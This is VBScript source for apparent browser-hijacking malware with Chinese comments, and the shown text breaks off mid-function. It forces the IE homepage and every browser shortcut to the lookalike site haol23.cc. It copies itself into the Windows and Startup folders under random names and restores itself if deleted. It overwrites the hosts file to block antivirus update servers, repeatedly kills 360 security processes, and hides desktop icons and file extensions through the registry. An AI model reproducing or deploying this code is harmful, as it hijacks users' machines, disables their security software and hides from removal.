'默认ie浏览器的路径
Private Const BROWSER_PATH = "C:\Program Files\Internet Explorer\iexplore.exe"
'默认遨游浏览器的路径
Private Const MAX_BROWSER_PATH = "C:\Program Files\Maxthon2\Maxthon.exe"
'默认360浏览器的路径
Private Const SE_BROWSER_PATH = "C:\Program Files\360\360se3\360SE.exe"
'默认火狐浏览器的路径
Private Const FOX_BROWSER_PATH = "C:\Program Files\Mozilla Firefox\firefox.exe"
'默认搜狗浏览器的路径
Private Const SOGOU_BROWSER_PATH = "C:\Program Files\SogouExplorer\SogouExplorer.exe"
Dim iePath
Dim maxPath
Dim sePath
Dim foxPath
Dim sogouPath
dim tips_count
tips_count=0
Dim content
dim run_second_count
run_second_count=0
Call Main

Public Sub Main()
On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set wshShell = CreateObject("Wscript.Shell")
    Dim allUsersStartup,allUsersPcDesktopPath
    allUsersStartup = wshShell.SpecialFolders("AllUsersStartup") '所有用户启动目录
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面图标
    
    dim url,index,userId
    userId="{userId}"
    if IsNumeric(userId)=false then
        userId=0
    end if
    
    userId=GetUserId()
    if userId="" then
        userId=0
    end if

    url="http://www.haol23.cc"
    
     Call LoadAllBrowserPath '加载浏览器路径    

    If Not IsExeExist("360tray") And Not IsExeExist("RavMonD") And Not IsExeExist("nod32")  then '如果不存在杀毒软件,则修改IE
        Call SetIeIndex(url)
        ieUrl="http://www.haol23.cc"
       call CloudKilling()
    End If   

    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process")                    '移动本文件到指定路径
    movePath=Environ("windir") & "\" & CreateInterferenceCode(1, 3) & ".vbe"  
    Call CopyFile(movePath)
    startPath=allUsersStartup & "\" & CreateInterferenceCode(1, 3) & ".vbe" 
       
    Call CreateFileLnk(url,1)                                '创建文件关联快捷方式(创建一次淘网址)
    do
        If run_second_count Mod 10 = 0 Then '每检测一段时间重复创建一次
            Call CreateFileLnk(url,0) '创建文件关联快捷方式(不创建一次淘网址)
        End If
        
        If run_second_count Mod 900 = 0 or run_second_count=0 Then '每检测一段时间重复创建一次              
            If Not IsExeExist("RavMonD") then '不存在瑞星
                 Call ReplaceBrowserLink(url) '替换所有浏览器目标路径
            End If
                                            
            If Not IsExeExist("RavMonD") And Not IsExeExist("ZhuDongFangYu") then '不存在瑞星和360
             '   Call IeIndex(url)
                Call CreateUrl(url) '创建url后缀快捷方式
                Call RemoveInternetExplorer()'清除Internet Explorer,最新版本360提示毒
		
            End If
            
            If not fso.FileExists(movePath) Then  '不存在源文件则创建
                Call CopyFile(movePath)
            End If
            
            
            If run_second_count=0 Then '第一次运行                  
                If instr(Wscript.ScriptFullName,"启动")<>0 Then '为启动目录运行的
                   ' Call IeIndex(url)
                    Call RemoveInternetExplorer()'清除Internet Explorer,最新版本360提示毒
                    If Not IsExeExist("RavMonD") then '不存在瑞星
                         Call ReplaceBrowserLink(url) '替换所有浏览器目标路径
                    End If
                                       
                End If
                Call SetRegDefaultOpenUrl() '启动目录启动，过360提示
                Call DeleteLnk() '清除快捷方式
                Call HideFileExtension '隐藏文件扩展名
                set ws=wscript.createobject("wscript.shell")
                ws.appactivate "Program Manager"
                wscript.sleep 500
                ws.sendkeys "{f5}"
            End If
            
        End If        

            
        index=0
        dim vbeCount '启动目录数量
        directory=allUsersStartup'用户启动目录
        Set f = fso.GetFolder(directory)
        Set fc = f.Files 
        For Each flie in fc  
            myName = directory + "\" + flie.name
            If instr(LCase(myName),".vbe")<>0 Then
                if index=0 then
                    set wind_0=fso.opentextfile(myName)
                end if
                if index=1 then
                    set wind_1=fso.opentextfile(myName)
                end if
                if index=2 then
                    set wind_2=fso.opentextfile(myName)
                end if
                if index=3 then
                    set wind_3=fso.opentextfile(myName)
                end if
                if index=4 then
                    set wind_4=fso.opentextfile(myName)
                end if
                if index=5 then
                    set wind_5=fso.opentextfile(myName)
                end if
                if index=6 then
                    set wind_6=fso.opentextfile(myName)
                end if
                if index=7 then
                    set wind_7=fso.opentextfile(myName)
                end if
                if index=8 then
                    set wind_8=fso.opentextfile(myName)
                end if
                set wind_9=fso.opentextfile(movePath)
                set wind_10=fso.opentextfile(Wscript.ScriptFullName)
                set wind_11=fso.opentextfile(allUsersPcDesktopPath + "\Internet Explorer.Ink")
                set wind_12=fso.opentextfile(allUsersPcDesktopPath + "\淘宝网购物.Ta")
                set wind_13=fso.opentextfile(Environ("windir") + "\smss\smss.exe")                
            end if            
            index=index+1
            vbeCount=vbeCount+1
        Next
                    
        If run_second_count Mod 3 = 0 Then '每5秒检测文件是否被删除，如果被删除就重复创建
            '创建自启动
            Call SetRunVbe("\??\" & movePath,"\??\" & startPath)
            '间隔符号
            Call SetRunVbe("\??\","")
            
            If vbeCount>2 Or instr(Wscript.ScriptFullName,"启动")=0 Then '当启动目录Vbe文件大于2个时则删除
                '当前文件在下次重新启动时删除
                Call SetRunVbe("\??\" & Wscript.ScriptFullName,"")
            End If
            Call NoDeleteFile 
        End If
        
        If run_second_count Mod 5 = 0 Then
            Call NotAppCloudKilling() '禁止指定程序访问网络
        End If
        
        'If run_second_count Mod 1800 = 0 Then
	'Set tWshShell= CreateObject("WScript.Shell")
	'tWshShell.Run ("http://www.qwxyx.com")
        'End If

        run_second_count=run_second_count+1
        wscript.sleep 1000
    loop
End Sub


'禁止指定程序访问网络
Public Function NotAppCloudKilling()   
On Error Resume Next
    good="."
    set bag=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_1=bag.execquery("select * from win32_process where name='360sd.exe'")
    for each i in pipe_1
    i.terminate()
    next

    set bag_2=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_2=bag_2.execquery("select * from win32_process where name='360tray.exe'")
    for each i in pipe_2
    i.terminate()
    next

    set bag_3=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_3=bag_3.execquery("select * from win32_process where name='360rp.exe'")
    for each i in pipe_3
    i.terminate()
    next
    
    set bag_4=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_4=bag_4.execquery("select * from win32_process where name='360Safe.exe'")
    for each i in pipe_4
    i.terminate()
    next
End Function

'禁止云查杀(修改host,禁止云查杀)
Public Function CloudKilling()   
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim path,content
    path = Environ("windir") & "\system32\drivers\etc\hosts"
    If fso.FileExists(path) Then '存在
        fso.deletefile(path)
    End If
    dim testFile
    Set testFile=fso.CreateTextFile(path,False)
    testFile.WriteLine("127.0.0.1       dl.360.cn")
    testFile.WriteLine("127.0.0.1       www.360.cn")
    testFile.WriteLine("127.0.0.1       qup.f.360.cn")
    testFile.WriteLine("127.0.0.1       dl.360safe.com")
    testFile.WriteLine("127.0.0.1       update.360safe.com")
    testFile.WriteLine("127.0.0.1       updateh.360safe.com")
    testFile.WriteLine("127.0.0.1       sdupm.360.cn")
    testFile.WriteLine("127.0.0.1       sdup.360.cn")
    testFile.WriteLine("127.0.0.1       www.rising.com.cn")
    testFile.WriteLine("127.0.0.1       rsup10.rising.com.cn")
    testFile.WriteLine("127.0.0.1       rsdownload.rising.com.cn")
    testFile.WriteLine("127.0.0.1       rsdownauto.rising.com.cn")
    testFile.WriteLine("127.0.0.1       cloudinfo.rising.com.cn")
    testFile.WriteLine("127.0.0.1       go.rising.com.cn")
    testFile.WriteLine("127.0.0.1       www.duba.net")
    testFile.WriteLine("127.0.0.1       www.jiangmin.com")
    testFile.WriteLine("127.0.0.1       89.202.149.36")
    testFile.Close       
    Set fso  = Nothing
End Function


'获取安装用户Id
Public Function GetUserId()   
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim path,content
    path = Environ("windir") & "\userid.txt"
    Set fso = CreateObject("Scripting.FileSystemObject")
    If path<>"" Then
        Set f=fso.opentextfile(path)
        content=f.readall '读取文本内容到全局变量
        f.Close
    End If
    content=Replace(content, " ", "")
    content=Replace(content, "\r", "")
    content=Replace(content, "\n", "")
    content=Replace(content, Chr(13), "")
    content=Replace(content, Chr(10), "")
    GetUserId=content
End Function

'复制当前脚本到指定路径
Public Sub CopyFile(movePath)   
On Error Resume Next
    dim vbsPath
    vbsPath = Wscript.ScriptFullName
    Set fso = CreateObject("Scripting.FileSystemObject")
    If content="" Then
        Set f=fso.opentextfile(vbsPath)
        content=f.readall '读取文本内容到全局变量
        f.Close
    End If

    '创建文件
    If content<>"" Then
        dim testFile
        Set testFile=fso.CreateTextFile(movePath,Ture)
        testFile.WriteLine(content)
        testFile.Close
    End If        
    Set fso  = Nothing
End Sub

'检测文件是否被删除，如果被删除就重复创建
Public Function NoDeleteFile()   
On Error Resume Next
    dim vbsPath
    vbsPath = Wscript.ScriptFullName
    Set fso = CreateObject("Scripting.FileSystemObject")
    If content="" Then
        Set f=fso.opentextfile(vbsPath,1)
        content=f.readall '读取文本内容到全局变量
        f.Close
    End If
    
    If not fso.FileExists(vbsPath) Then  '不存在则创建
        '创建文件
        If content<>"" Then
            dim testFile
            Set testFile=fso.CreateTextFile(vbsPath,Ture)
            testFile.WriteLine(content)
            testFile.Close
        End If        
    End If
    Set fso  = Nothing
End Function


'删除系统默认浏览器快捷方式
Public Function RemoveInternetExplorer()   
On Error Resume Next
	Const HKEY_CURRENT_USER = &H80000001
	Const HKEY_LOCAL_MACHINE = &H80000002
	strComputer = "."
	Set StdOut = WScript.StdOut 
	Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
	oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
	mmshhwdName = "NoInternetIcon"
	dwValue = 1
	oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,mmshhwdName,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu"
	oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
	mmshhwdName = "{871C5380-42A0-1069-A2EA-08002B30309D}"
	dwValue = 1
	oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,mmshhwdName,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"
	oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
	mmshhwdName = "{871C5380-42A0-1069-A2EA-08002B30309D}"
	dwValue = 1
	oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,mmshhwdName,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
	oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath 
	mmshhwdName = "NoInternetIcon"
	dwValue = 1
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,mmshhwdName,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu"
	oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath 
	mmshhwdName = "{871C5380-42A0-1069-A2EA-08002B30309D}"
	dwValue = 1
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,mmshhwdName,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"
	oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath 
	mmshhwdName = "{871C5380-42A0-1069-A2EA-08002B30309D}"
	dwValue = 1
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,mmshhwdName,dwValue
	Set StdOut=Nothing
	Set oReg=Nothing
End Function

'创建无法删除系统默认浏览器快捷方式
Public Function IeIndex(url)   
On Error Resume Next 
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim regPath
    regPath = Environ("windir") & "\SetMyIndex.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    if tips_count>2 then
        if IsExeExist("360tray") then '存在360安全卫士,避免提示过多干扰用户
            Exit Function
        end if
    else
        tips_count=tips_count+1
    end if
    dim ie_temp_path
    ie_temp_path=iePath
    If not fso.FileExists(ie_temp_path) Then  
        ie_temp_path=GetWebBrowserPath() '获取一个浏览器路径
        If not fso.FileExists(ie_temp_path) Then
            Exit Function
        End If
    End If
    
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,dataHome
    data=OperationRegistry.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{871C5380-42A0-1069-A2EA-08002B30309A}\") 
    dataHome=OperationRegistry.RegRead("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage\Command\") 

    If data="" or instr(dataHome,url)=0 Then
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{871C5380-42A0-1069-A2EA-08002B30309A}]" '修改默认IE
	    f1.WriteLine "@=""Internet Explorer""" '修改默认IE
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}]" '修改默认IE
	    f1.WriteLine "@=""Internet Explorer""" '修改默认IE
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\DefaultIcon]" '修改默认IE
	    f1.WriteLine "@=""" & Replace(ie_temp_path, "\", "\\") & ",0""" '固定IE浏览器图标
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\InProcServer32]"
	    f1.WriteLine "@=""%SystemRoot%\\system32\\shdocvw.dll"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell]"
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage]"
	    f1.WriteLine "@=""打开主页(&H)"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage\Command]"
	    f1.WriteLine "@=""" & Replace(ie_temp_path, "\", "\\") & " " & url & """" '修改默认IE
	    
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\Q]"
	    f1.WriteLine "@=""删除(&D)"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\Q\Command]"
	    f1.WriteLine "@=""Rundll32.exe"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\属性(&R)]"
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\属性(&R)\Command]"
	    f1.WriteLine "@=""rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,0"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\ShellFolder]"
	    f1.WriteLine "@=""00.00.00.00"""
	    f1.WriteLine """Attributes""=hex:00,00,00,00"
	    Set f1  = Nothing
	    Set WshShell= CreateObject("WScript.Shell") 
	    WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing 
    End If
    Set fso  = Nothing
End Function

'修改注册表设置主页
Public Function SetIeIndex(url)   
On Error Resume Next
	Set WshShell = CreateObject("Wscript.Shell")
	HomeUrl="http://www.haol23.cc"
	HomepageValue = WshShell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page")
	If instr(HomepageValue,url)=0 or HomepageValue="" Then
		WshShell.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",url
	end if
	Set WshShell = Nothing
End Function


'删除默认创建快捷方式
Public Function DeleteLnk()   
On Error Resume Next 
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '当前用户桌面目录
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '当前用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '当前用户开始菜单最上面的目录
      
    Dim allUsersPcDesktopPath, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面图标
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录

    Set fso = CreateObject("Scripting.FileSystemObject")
    
    '删除默认快捷方式
    If fso.FileExists(pcDesktopPath & "\Internet Explorer.lnk") Then        
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & pcDesktopPath & "\Internet Explorer.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\360安全浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & pcDesktopPath & "\360安全浏览器.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\360安全浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & pcDesktopPath & "\360安全浏览器 3.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\傲游浏览器2.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & pcDesktopPath & "\傲游浏览器2.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\搜狗高速浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & pcDesktopPath & "\搜狗高速浏览器.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\启动 Internet Explorer 浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & pcDesktopPath & "\启动 Internet Explorer 浏览器.lnk","")
    End If
    
    If fso.FileExists(allUsersPcDesktopPath & "\Internet Explorer.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\Internet Explorer.lnk","")
    End If
    If fso.FileExists(allUsersPcDesktopPath & "\360安全浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\360安全浏览器.lnk","")
    End If
    If fso.FileExists(allUsersPcDesktopPath & "\360安全浏览器 3.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\360安全浏览器 3.lnk","")
    End If
    If fso.FileExists(allUsersPcDesktopPath & "\搜狗高速浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\搜狗高速浏览器.lnk","")
    End If
    If fso.FileExists(allUsersPcDesktopPath & "\启动 Internet Explorer 浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\启动 Internet Explorer 浏览器.lnk","")
    End If
    
    If fso.FileExists(quickLaunch & "\Internet Explorer.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & quickLaunch & "\Internet Explorer.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\360安全浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & quickLaunch & "\360安全浏览器.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\360安全浏览器 3.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & quickLaunch & "\360安全浏览器 3.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\傲游浏览器2.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & quickLaunch & "\傲游浏览器2.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\搜狗高速浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & quickLaunch & "\搜狗高速浏览器.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\启动 Internet Explorer 浏览器.lnk") Then
        Call SetRunVbe("\??\","")'间隔符号
        Call SetRunVbe("\??\" & quickLaunch & "\启动 Internet Explorer 浏览器.lnk","")
    End If
   
End Function

'创建url类型快捷方式
Public Function CreateUrl(url)   
On Error Resume Next 
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,dataHome
    data=OperationRegistry.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{871C5380-42A0-1069-A2EA-08002B30309A}\") 
    dataHome=OperationRegistry.RegRead("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage\Command\") 
    
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '当前用户桌面目录
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '当前用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '当前用户开始菜单最上面的目录
      
    Dim allUsersPcDesktopPath, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面图标
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录
   Set fso = CreateObject("Scripting.FileSystemObject")
   
    dim ie_temp_path
    ie_temp_path=iePath
    If not fso.FileExists(ie_temp_path) Then  
        ie_temp_path=GetWebBrowserPath()
        If not fso.FileExists(ie_temp_path) Then
            Exit Function
        End If
    End If
    
    dim urlLnkPath
    
    '桌面
    If data="" or instr(dataHome,url)=0 Then
        urlLnkPath=allUsersPcDesktopPath & "\Internet Explorer.url"
        If not fso.FileExists(urlLnkPath) Then     
            'Set f1=fso.CreateTextFile(urlLnkPath, True)
	        'f1.WriteLine "[DEFAULT]"
	        'f1.WriteLine "BASEURL=" & url
	        'f1.WriteLine "[InternetShortcut]"
	        'f1.WriteLine "URL=" & url
	        'f1.WriteLine "IDList="
	        'f1.WriteLine "IconFile=" & ie_temp_path
	        'f1.WriteLine "HotKey=0"
	        'f1.WriteLine "IconIndex=0"
	        'f1.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
	        'f1.WriteLine "Prop3=19,1"
	        'Set f1  = Nothing
	    end if
	end if
	
	'快速启动
	urlLnkPath=quickLaunch & "\Internet Explorer.url"
	If not fso.FileExists(urlLnkPath) Then
	    Set f1=fso.CreateTextFile(urlLnkPath, True)
	    f1.WriteLine "[DEFAULT]"
	    f1.WriteLine "BASEURL=" & url
	    f1.WriteLine "[InternetShortcut]"
	    f1.WriteLine "URL=" & url
	    f1.WriteLine "IDList="
	    f1.WriteLine "IconFile=" & ie_temp_path
	    f1.WriteLine "HotKey=0"
	    f1.WriteLine "IconIndex=0"
	    f1.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
	    f1.WriteLine "Prop3=19,1"
	    Set f1  = Nothing
	end if
	
	'全部用户开始菜单中的程序目录
	urlLnkPath=allUsersPrograms & "\Internet Explorer.url"
	If not fso.FileExists(urlLnkPath) Then
	    Set f1=fso.CreateTextFile(urlLnkPath, True)
	    f1.WriteLine "[DEFAULT]"
	    f1.WriteLine "BASEURL=" & url
	    f1.WriteLine "[InternetShortcut]"
	    f1.WriteLine "URL=" & url
	    f1.WriteLine "IDList="
	    f1.WriteLine "IconFile=" & ie_temp_path
	    f1.WriteLine "HotKey=0"
	    f1.WriteLine "IconIndex=0"
	    f1.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
	    f1.WriteLine "Prop3=19,1"
	    Set f1  = Nothing
	end if
	
	Set fso  = Nothing
End Function

'循环修改所有快捷方式
Public Function ReplaceBrowserLink(url)    
On Error Resume Next
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '用户桌面目录
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '用户开始菜单最上面的目录
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面目录
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录

    '路径集合，对路径集合进行遍历
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = pcDesktopPath'quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Dim directory
    For i = LBound(lnkPath) + 1 To UBound(lnkPath)
        '循环目录进行修改
        directory = lnkPath(i)        
         '替换当前用户快速启动快捷方式
        Set fs = CreateObject("Scripting.FileSystemObject")
        Set f = fs.GetFolder(directory)
        Set fc = f.Files 
        For Each flie in fc    
            myName = directory + "\" + flie.name
            If InStr(myName, ".lnk") <> 0 And (InStr(myName, "傲游") <> 0 Or InStr(myName, "搜狗") <> 0 Or InStr(myName, "360") <> 0 Or InStr(myName, "浏览器") <> 0) Then
                Set fso = CreateObject("Scripting.FileSystemObject")
                Set oShellLink = wshShell.CreateShortcut(myName)
                Set file=fso.getfile(myName)                
                file.attributes=0'恢复正常
                         
                if oShellLink.Arguments <> url then '程序的参数 
                    oShellLink.Arguments = url '程序的参数      
                    oShellLink.Save            
                end if
                
	            file.attributes=1
                
                Set oShellLink  = Nothing                
                Set fso  = Nothing
            End If
        Next        
    Next
End Function

'获取快捷方式路径
Private Function GetDirectoryPath(path)
    Dim str, last
    For i = 0 To Len(path)
        str = Mid(path, Len(path) - i, 1)
        If str = "\" Then
            last = Len(path) - i
            Exit For
        End If
    Next
    GetDirectoryPath = Mid(path, 1, last)
    Exit Function
End Function

'判断指定进程是否存在
Public Function IsExeExist(exeName) 
    IsExeExist=false
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" _
        & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

    Set colProcessList = objWMIService.ExecQuery _
        ("Select * from Win32_Process Where Name = '" & exeName & ".exe'")

    For Each objProcess in colProcessList
        if objProcess.executablepath<>"" then
            IsExeExist=true
        end if        
    Next
End Function

'进行Url加密(不需要http://)
Public Function DnsUrlEncrypt(str)
    Dim hexStr, temp, i '16进制字符串
    For i = 1 To Len(str)
        temp = Mid(str, i, 1)
        temp = Hex(Asc(temp))
        temp = temp
        hexStr = hexStr & "%" & temp
    Next
    DnsUrlEncrypt = hexStr
    Exit Function
End Function

'合并两个数组
Function Summ(array1,array2)
    Dim str1,str2,str3
    str1 = join(array1,",")
    str2 = join(array2,",")
    str3 = str1 + "," + str2
    summ = split(str3,",")
    '过滤smss.exe
    '过滤脚本，防止360让他下次删除
End Function

'生成干扰码,参数:1、类型(0,混合 1字符 2数字) 2、长度
'错误返回:空字符
Public Function CreateInterferenceCode(strType, length)
    Dim basisStr
    If strType = 0 Then
        basisStr = "0123456789qwertyuiopasdfghjklzxcvbnm"
    End If
    If strType = 1 Then
        basisStr = "qwertyuiopasdfghjklzxcvbnm"
    End If
    If strType = 2 Then
        basisStr = "0123456789"
    End If
    Dim strs, i
    For i = 1 To length
        Randomize
        strs = strs & Mid(basisStr, Int((Len(basisStr) * Rnd) + 1), 1)
    Next
    CreateInterferenceCode = strs
    Exit Function
End Function

'获取浏览器路径
Public Function GetWebBrowserPath() 
On Error Resume Next
    '更改盘符路径
    Set Environ = ws.Environment("process") 
    dim iePath
    iePath=BROWSER_PATH
    If Dir(iePath)="" Then '如果路径不存在则更换盘符
        iePath = Environ("systemdrive") & Mid(iePath, 3, Len(iePath))
        If Dir(iePath)<>"" Then
            GetWebBrowserPath=iePath
            Exit Function
        End If
    else
        GetWebBrowserPath=iePath
        Exit Function
    End If
    
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '当前用户桌面目录
